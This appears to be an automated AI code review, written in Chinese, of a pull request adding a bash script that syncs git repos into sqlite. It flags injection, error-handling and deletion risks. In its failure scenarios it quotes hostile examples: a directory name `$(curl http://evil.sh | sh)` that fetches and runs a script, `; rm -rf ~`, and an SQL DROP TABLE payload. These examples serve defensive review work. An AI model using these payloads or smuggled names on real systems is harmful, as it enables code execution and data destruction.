<!-- deepseek-review -->
## 🤖 DeepSeek Code Review — 🛑 建議修改後再合併

此 PR 新增一個 bash 腳本，用於批次同步多個 git repo 並將結果寫入 sqlite。主要風險在於 shell 注入（透過 eval 與未加引號的變數）、錯誤處理不足（git 指令失敗仍繼續執行）、以及資料完整性問題（ahead 可能為空導致 SQL 錯誤）。建議先修正安全性與錯誤處理問題再合併。

### Findings（7 筆）

| | Severity | 位置 | 問題 | 信心 |
|---|---|---|---|---|
| 🛑 | Blocker | `sandbox/repo_sync.sh:56` | eval 執行未受信任的 hook 參數，存在命令注入風險 | 0.95 |
| 🛑 | Blocker | `sandbox/repo_sync.sh:47` | SQL 注入風險：repo 名稱與 branch 未經跳脫直接插入 SQL | 0.90 |
| ⚠️ | Major | `sandbox/repo_sync.sh:34` | git 指令失敗未中止，可能導致錯誤結果寫入資料庫 | 0.85 |
| ⚠️ | Major | `sandbox/repo_sync.sh:41` | ahead 變數可能為空，導致 SQL 語法錯誤 | 0.80 |
| ⚠️ | Major | `sandbox/repo_sync.sh:37` | git checkout 未加引號，branch 名稱可能被 shell 展開 | 0.75 |
| ⚠️ | Major | `sandbox/repo_sync.sh:62` | cleanup_cache 使用 rm -rf 刪除目錄內容，若 ROOT 未正確設定可能造成災難性刪除 | 0.70 |
| 🔸 | Minor | `sandbox/repo_sync.sh:68` | summarize 中 total 計算可能因 grep 失敗而錯誤 | 0.60 |

<details><summary>🛑 <b>Blocker</b> — <code>sandbox/repo_sync.sh:56</code> eval 執行未受信任的 hook 參數，存在命令注入風險</summary>

`run_hook` 使用 `eval "$hook $repo"` 執行 hook。`$repo` 來自 `basename "$dir"`，而 `$dir` 來自 `ls "$ROOT"` 的輸出。如果 repo 目錄名稱包含 shell 特殊字元（例如 `$(malicious)` 或 `; rm -rf ~`），這些字元會被 eval 解釋並執行，導致任意命令執行。

**失敗情境**：攻擊者在 `$ROOT` 下建立一個名為 `$(curl http://evil.sh | sh)` 的目錄，且該目錄包含 `.git` 子目錄，腳本執行到 `run_hook` 時就會下載並執行惡意腳本。

**建議**：避免使用 eval，改為直接執行：`"$hook" "$repo"`。若 hook 需要 shell 解析參數，應改用陣列傳遞或明確限制 repo 名稱格式。

**判斷依據**：diff 第 51 行：`eval "$hook $repo"`，其中 `$repo` 來自 `basename "$dir"`，而 `$dir` 來自 `ls "$ROOT"` 的輸出，未經任何 sanitization。

</details>

<details><summary>🛑 <b>Blocker</b> — <code>sandbox/repo_sync.sh:47</code> SQL 注入風險：repo 名稱與 branch 未經跳脫直接插入 SQL</summary>

`sqlite3 "$DB" "INSERT INTO runs VALUES('$name', '$BRANCH', $ahead, datetime('now'))"` 中，`$name` 和 `$BRANCH` 直接拼接進 SQL 字串。雖然 `$BRANCH` 有正規表示式驗證，但 `$name` 完全未驗證。如果 repo 目錄名稱包含單引號（例如 `test'repo`），會破壞 SQL 語法或注入惡意 SQL。

**失敗情境**：建立一個名為 `x'); DROP TABLE runs;--` 的 repo 目錄，執行腳本後 runs 表會被刪除。

**建議**：使用參數化查詢（sqlite3 支援 `?` 佔位符）或對所有插入值進行跳脫（例如將 `'` 替換為 `''`）。

**判斷依據**：diff 第 43 行：直接將 `$name` 和 `$BRANCH` 插入 SQL 字串，未使用參數化或跳脫。

</details>

<details><summary>⚠️ <b>Major</b> — <code>sandbox/repo_sync.sh:34</code> git 指令失敗未中止，可能導致錯誤結果寫入資料庫</summary>

`git fetch`、`git checkout`、`git merge` 的 stderr 被重定向到 log，但 exit code 未檢查。若 fetch 失敗（例如網路問題），後續 checkout 和 merge 可能基於過時的遠端分支，導致 `ahead` 計算錯誤，並將錯誤結果寫入資料庫。

**失敗情境**：網路中斷時，`git fetch` 失敗，但腳本繼續執行，`git merge --ff-only` 可能因遠端分支不存在而失敗，但 `ahead` 仍會計算（可能為空或錯誤），最終將不正確的資料寫入 runs 表。

**建議**：在每個 git 指令後檢查 exit code，失敗時記錄錯誤並跳過該 repo（或中止整個腳本）。

**判斷依據**：diff 第 33-37 行：git 指令的 stderr 被重定向，但未檢查 exit code。

</details>

<details><summary>⚠️ <b>Major</b> — <code>sandbox/repo_sync.sh:41</code> ahead 變數可能為空，導致 SQL 語法錯誤</summary>

`ahead=$(git rev-list --count "origin/$BRANCH"..HEAD 2>/dev/null)` 若 git rev-list 失敗（例如 origin/$BRANCH 不存在），`ahead` 會是空字串。後續 SQL 插入 `$ahead` 時會產生 `INSERT INTO runs VALUES('repo', 'branch', , datetime('now'))`，導致 SQL 錯誤。

**失敗情境**：若 `git fetch` 未成功取得遠端分支，`origin/$BRANCH` 不存在，`git rev-list` 失敗，`ahead` 為空，SQL 插入失敗。

**建議**：在計算 ahead 後檢查是否為空，若為空則設定為 0 或跳過該 repo。

**判斷依據**：diff 第 40 行：`ahead` 可能為空，未做預設值處理。

</details>

<details><summary>⚠️ <b>Major</b> — <code>sandbox/repo_sync.sh:37</code> git checkout 未加引號，branch 名稱可能被 shell 展開</summary>

`git checkout $BRANCH` 中 `$BRANCH` 未加引號。雖然前面有正規表示式驗證，但若 branch 名稱包含 glob 字元（例如 `*`）或空格（雖然正規表示式不允許空格），仍可能被 shell 展開或分割。

**失敗情境**：若 branch 名稱包含 `*`（例如 `feature/*`），shell 會嘗試展開為符合的檔案名稱，可能導致 checkout 錯誤的分支。

**建議**：將 `$BRANCH` 加上雙引號：`git checkout "$BRANCH"`。

**判斷依據**：diff 第 34 行：`$BRANCH` 未加引號。

</details>

<details><summary>⚠️ <b>Major</b> — <code>sandbox/repo_sync.sh:62</code> cleanup_cache 使用 rm -rf 刪除目錄內容，若 ROOT 未正確設定可能造成災難性刪除</summary>

`rm -rf "$ROOT"/.cache/*` 若 `$ROOT` 為空或未設定，會變成 `rm -rf /.cache/*`，可能刪除系統檔案。雖然 main 中有檢查 `$BRANCH`，但未檢查 `$ROOT` 是否為空。

**失敗情境**：使用者執行 `./repo_sync.sh "" main`，`$ROOT` 為空，`rm -rf /.cache/*` 會嘗試刪除根目錄下的 .cache 內容。

**建議**：在 main 中檢查 `$ROOT` 是否為空，並確保 `$ROOT` 是絕對路徑或至少非空。

**判斷依據**：diff 第 58 行：`rm -rf "$ROOT"/.cache/*`，未檢查 `$ROOT` 是否為空。

</details>

<details><summary>🔸 <b>Minor</b> — <code>sandbox/repo_sync.sh:68</code> summarize 中 total 計算可能因 grep 失敗而錯誤</summary>

`total=$(grep -c . "$LOG" 2>/dev/null) || total=0` 若 grep 因檔案不存在而失敗，`total` 會被設為 0，但若 grep 因其他原因失敗（例如權限問題），也會被設為 0，可能隱藏錯誤。

**建議**：分開處理檔案不存在與其他錯誤，或使用 `wc -l` 替代。

**判斷依據**：diff 第 69 行：`|| total=0` 會將所有 grep 失敗都視為 0。

</details>

---

<sub>model `deepseek-v4-pro` ｜ prompt tokens 2430 (cache hit 2304) ｜ completion tokens 2328 ｜ PR #13</sub>